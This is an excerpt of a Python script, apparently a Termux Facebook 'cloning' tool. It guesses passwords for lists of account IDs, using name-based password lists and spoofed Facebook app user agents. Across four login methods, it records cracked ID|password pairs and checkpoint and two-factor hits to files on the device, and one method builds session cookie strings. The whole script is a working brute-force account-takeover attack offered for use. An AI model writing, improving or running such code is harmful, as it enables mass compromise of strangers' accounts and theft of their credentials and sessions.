...
if ltx > 12:
    ...
    tag = "AM"
#---------------------------------------------[UPDATE SERVER]---------------------------------------------#
SALAR1 = requests.get("Add your server url").text.strip()
SALAR2 = requests.get("Add your server url").text.split('\n')[0]
SALAR3 = requests.get("Add your server url").text.strip()
SALAR4 = requests.get("Add your server url").text.strip()
#---------------------------------------------[FILE UPDATE]---------------------------------------------#
arafat1 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{SALAR1}'
arafat2 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{SALAR2}'
arafat3 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{SALAR3}'
arafat4 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{SALAR4}'
...
{W}▬▭▬▭▬▭▬▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▭\n 
AUTHOR  : {G}PRINCE SALAR
OWNER   : {G}PRINCE RAHIAN
VERSION:  3.1.0
GITHUB  : {G}PriNce-SaLaR
TOOL    : {G}FILE {R}× {G}RANDOM\n{self.line}""")
...
#_____________________[FILE MENU BOX]____________________________#
    def __fILe_MenU__(self):
        ...
        if xdx in ['1','a','A']:
            ...
            elif coun in ['2','b','B']:plist.append('first last');plist.append('firstlast');plist.append('afghan12345');plist.append('afghan123');plist.append('afghanistan')
...
#_____________________[FILE METHOD S1]____________________________#
    def __file__s1__(self,ids,names,limit,passlist):
        try:
            ...
            sys.stdout.write(f"\r\r{W}[{G}PRINCE{W}|{G}S1{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fs = names.split(' ')[0]
            try:
                ls = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                with requests.Session() as session:
                    ...
                    if 'session_key' in q:
                        ...
                        print(f'\r\r{W}[{G}::{W}] {W}[{G}SALAR-OK{W}] {G}{ids} {R}× {G}{pas}')
                        ok.append(ids)
                        open('/sdcard/SALAR-FILE-M1-OK.txt', 'a').write(ids+'|'+pas+"\n")
                        #open('/sdcard/SALAR-FILE-M1-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                        if 'y' in cokix:
                        ...
                        if 'y' in cpx:
                            print(f'\r\r{W}[{R}::{W}] {W}[{R}SALAR-CP{W}] {R}{ids} {R}× {R}{pas}')
                            break
                    elif twwf in str(q):
                        twf.append(ids)
                        open('/sdcard/SALAR-FILE-M1-2F.txt','a').write(ids+'|'+pas+'\n')
                        if 'y' in twx:
                            print(f'\r\r{W}[{B}::{W}] {W}[{B}SALAR-2F{W}] {B}{ids} {R}× {B}{pas}')
                            break
                    else:continue
            loop+=1
...
#_____________________[FILE METHOD S2]____________________________#
    ...
    def __file__s2__(self,ids,names,limit,passlist):
        try:
            global ok,cp,twf,loop,okx
            sys.stdout.write(f"\r\r{W}[{G}PRINCE{W}|{G}S2{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fs = names.split(' ')[0]
            try:
                ls = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                with requests.Session() as session:
                    ...
                    if 'session_key' in q:
                        ...
                        print(f'\r\r{W}[{G}::{W}] {W}[{G}SALAR-OK{W}] {G}{ids} {R}× {G}{pas}')
                        ok.append(ids)
                        open('/sdcard/SALAR-FILE-M2-OK.txt', 'a').write(ids+'|'+pas+"\n")
                        #open('/sdcard/SALAR-FILE-M2-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                        if 'y' in cokix:
                            print(f'\r\r{W}[{G}::{W}] {W}[{G}COOKIE{W}] {R}× {G}{coki}');print(self.line)
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        ...
                        twf.append(ids)
                        open('/sdcard/SALAR-FILE-M2-2F.txt','a').write(ids+'|'+pas+'\n')
                        if 'y' in twx:
                            print(f'\r\r{W}[{B}::{W}] {W}[{B}SALAR-2F{W}] {B}{ids} {R}× {B}{pas}')
                            break
                    else:continue
...
#_____________________[FILE METHOD S3]____________________________#
    ...
    def __file__s3__(self,ids,names,limit,passlist):
        try:
            ...
            sys.stdout.write(f"\r\r{W}[{G}PRINCE{W}|{G}S3{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                if 'session_key' in po:
                    ...
                    print(f'\r\r{W}[{G}::{W}] {W}[{G}SALAR-OK{W}] {G}{ids} {R}× {G}{pas}')
                    open('/sdcard/SALAR-FILE-M3-OK.txt', 'a').write(ids+'|'+pas+"\n")
                    #open('/sdcard/SALAR-FILE-M3-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                    ok.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\033[1;33m [SALAR-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/SALAR-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                    cp.append(ids)
                    break
                else:
                    continue
...
#_____________________[FILE METHOD S4]____________________________#
    ...
    def __file__s4__(self,ids,names,limit,passlist):
        try:
            global ok,cp,loop,okx
            sys.stdout.write(f"\r\r{W}[{G}PRINCE{W}|{G}S4{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                if 'session_key' in po:
                    ...
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"
                    print(f'\r\r{W}[{G}::{W}] {W}[{G}SALAR-OK{W}] {G}{ids} {R}× {G}{pas}')
                    open('/sdcard/SALAR-FILE-M4-OK.txt', 'a').write(ids+'|'+pas+"\n")
                    #open('/sdcard/SALAR-FILE-M4-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                    ok.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\033[1;33m [SALAR-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/SALAR-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                    cp.append(ids)
                    break
                else:
                    continue
